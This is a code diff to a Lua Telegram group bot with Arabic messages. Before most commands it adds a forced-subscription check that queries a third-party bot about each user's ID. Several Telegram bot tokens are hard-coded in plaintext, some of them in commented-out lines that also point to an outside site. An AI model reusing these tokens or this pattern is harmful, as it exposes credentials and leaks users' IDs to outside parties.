+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end     
 send(msg.chat_id_, msg.id_, 1, '📥┇ ارسل الكلمه المراد حذفها الان \n', 1, 'md')  
 datahmade:set('SNIEBR:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_,"rep")  
 return false  
@@ -7285,6 +7390,11 @@ end -- if is_mod(msg) then
 ------------------------------------------------------------------------
 ------------------------------------------------------------------------
 if text and text:match("^كشف القيود @(.*)$") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local ap = {string.match(text, "^(كشف القيود) @(.*)$")}
 function kewd_by_username(extra, result, success)
 if result.id_ then
@@ -7314,6 +7424,11 @@ return false
 end
 ------------------------------------------------------------------------
 if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local res = {string.match(text, "^(تنزيل الكل) @(.*)$")}
 function by_username(extra, result, success)
 if result.id_ then
@@ -7378,6 +7493,11 @@ end
 resolve_username(res[2],by_username)
 end
 if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 function promote_by_reply(extra, result, success)
 if is_devahmads(result.sender_user_id_) == true then
 send(msg.chat_id_, msg.id_, 1, "📮┇ دكعد راحه هاذ مطوري 😒 ", 1 , 'md')
@@ -7454,6 +7574,11 @@ end
 end
 ------------------------------------------------------------------------
 if (text and text == "رتبتي") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if msg.sender_user_id_ == tonumber(sudo_add) then
 t = 'المطور الاساسي'
 elseif is_sudo(msg) then
@@ -7628,18 +7753,23 @@ resolve_username(ap[2],id_by_username)
 end  
 ------------------------------------------------------------------------
 if text == ("الرابط") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if not datahmade:get("SNIEBR:mute:link:gr:"..bot_id..msg.chat_id_) then 
 function dl_cb222( t1,t2 )
 if (datahmade:get('SNIEBR:'..bot_id.."group:link"..msg.chat_id_) and datahmade:get('SNIEBR:'..bot_id.."group:link"..msg.chat_id_) ~= "Error") then 
-send(msg.chat_id_, msg.id_, 1, '📮┇ *رابط المجموعه* \n['..datahmade:get('SNIEBR:'..bot_id.."group:link"..msg.chat_id_)..']', 1, "md")
+send(msg.chat_id_, msg.id_, 1, '*📮┇𝗚𝗿𝘂𝗼𝗽 𝗟𝗶𝗹𝗻𝗸* \n['..datahmade:get('SNIEBR:'..bot_id.."group:link"..msg.chat_id_)..']', 1, "md")
 elseif t2.invite_link_ ~= false then 
-send(msg.chat_id_, msg.id_, 1, '📮┇ *رابط المجموعه* \n['..(t2.invite_link_ or "Error")..']', 1, "md")
+send(msg.chat_id_, msg.id_, 1, '*📮┇𝗚𝗿𝘂𝗼𝗽 𝗟𝗶𝗹𝗻𝗸* \n['..(t2.invite_link_ or "Error")..']', 1, "md")
 else
 local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
 local req = https.request(getlink)
 local link = json:decode(req)
 if link.ok == true then 
-send(msg.chat_id_, msg.id_, 1, '📮┇ *رابط المجموعه* \n['..(link.result or "Error")..']', 1, "md")
+send(msg.chat_id_, msg.id_, 1, '*📮┇𝗚𝗿𝘂𝗼𝗽 𝗟𝗶𝗹𝗻𝗸* \n['..(link.result or "Error")..']', 1, "md")
 datahmade:set('SNIEBR:'..bot_id.."group:link"..msg.chat_id_,link.result)
 else 
 send(msg.chat_id_, msg.id_, 1, '⚠️┇لا يمكني الوصل الى الرابط عليك منحي صلاحيه {دعوه المستخدمين من خلال الرابط}', 1, "html")
@@ -7656,6 +7786,11 @@ end
 end
 -----------------------------------------------------------
 if (text == ("رسائلي") or text == ("^msg$")) and msg.reply_to_message_id_ == 0  then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local user_msgs = datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
 local tahna = (datahmade:get('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
 if not datahmade:get('SNIEBR:'..bot_id..'id:mute'..msg.chat_id_) then
@@ -7665,21 +7800,41 @@ end
 end
 ------------------------------------------------------------------------
 if text == ("جهاتي") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 add = (tonumber(datahmade:get('SNIEBR:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
 send(msg.chat_id_, msg.id_, 1, "📨┇عدد اضافه جهاتك ~⪼ *{"..add.."}*\n📨┇سيتم حذف العدد بعد هذه الرساله", 1, 'md')
 datahmade:del('SNIEBR:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
 end
 if text == ("عدد السحكات") or text == ("سحكاتي") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local edit = datahmade:get('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
 send(msg.chat_id_, msg.id_, 1, "📮┇ سحكاتك   *("..edit..")*", 1, 'md')
 end
 if text == 'حذف سحكاتي' then 
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 datahmade:del('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_)
 local SNIEBR = '🗑 ┇ تم حذف سحكاتك '
 send(msg.chat_id_, msg.id_, 1, SNIEBR, 1, 'md')
 end
 ------------------------------------------------------------------------
 if text == ("اطردني") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if not datahmade:get('SNIEBR:'..bot_id..'kickme:mute'..msg.chat_id_) then
 redis:set('SNIEBR:'..bot_id..'kickyess'..msg.sender_user_id_..'', 'kickyes')
 redis:set('SNIEBR:'..bot_id..'kicknoo'..msg.sender_user_id_..'', 'kickno')
@@ -7758,6 +7913,11 @@ send(msg.chat_id_, msg.id_, 1, "*"..msg.chat_id_.."*", 1, 'md')
 end
 ------------------------------------------------------------------------
 if (text == ("ايدي") or text == ("id") ) and msg.reply_to_message_id_ == 0 then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if not datahmade:sismember('SNIEBR:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي') then
 datahmade:sadd('SNIEBR:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,'ايدي')
 local keko_info = nil
@@ -8474,6 +8634,11 @@ end
 end
 ------------------------------------------------------------------------
 if text =='مجوهراتي' then 
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if tonumber((datahmade:get('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 taha = '*💬┇ليس لديك مجوهرات ، \n💎┇للحصول ؏ مجوهرات ، \n📮┇ارسل الالعاب وابدأ اللعب !*\n'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
@@ -8485,6 +8650,11 @@ end
 end
 ------------------------------------------------------------------------
 if text == 'بيع مجوهراتي' then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 if tonumber((datahmade:get('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 taha = '*💬┇ليس لديك مجوهرات ، \n💎┇للحصول ؏ مجوهرات ، \n📮┇ارسل الالعاب وابدأ اللعب !*\n'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
@@ -8498,18 +8668,33 @@ end
 end
 ------------------------------------------------------------------------
 if text == 'حذف مجوهراتي' then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 datahmade:del('SNIEBR:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)  
 datahmade:del('SNIEBR:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_)  
 send(msg.chat_id_, msg.id_, 1, "تم حذف جميع مجوهراتك", 1, "md") 
 end
 ------------------------------------------------------------------------
 if text == 'حذف رسائلي' then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 datahmade:del('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
 datahmade:del('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
 send(msg.chat_id_, msg.id_, 1, "🗑 ┇ تم حذف رسائلك  ", 1, "md") 
 end
 ------------------------------------------------------------------------
 if text == ("الاوامر") and (is_mod(msg) or is_creatorbasic(msg)) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local help = redis:get('SNIEBR:'..bot_id..'help')
 local text =  [[
 📮┇هناكـ {6} اوامر لعرضها
@@ -8526,12 +8711,17 @@ local text =  [[
 
 👥┇م6 ← آوامر المطورين 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡 ┇Ch~⪼ @SNIEBR  ☑
+📡 ┇Ch~⪼ @XOUXU  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end
 ------------------------------------------------------------------------
 if (text == ("م1") or text == "م١") and (is_mod(msg) or is_creatorbasic(msg)) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
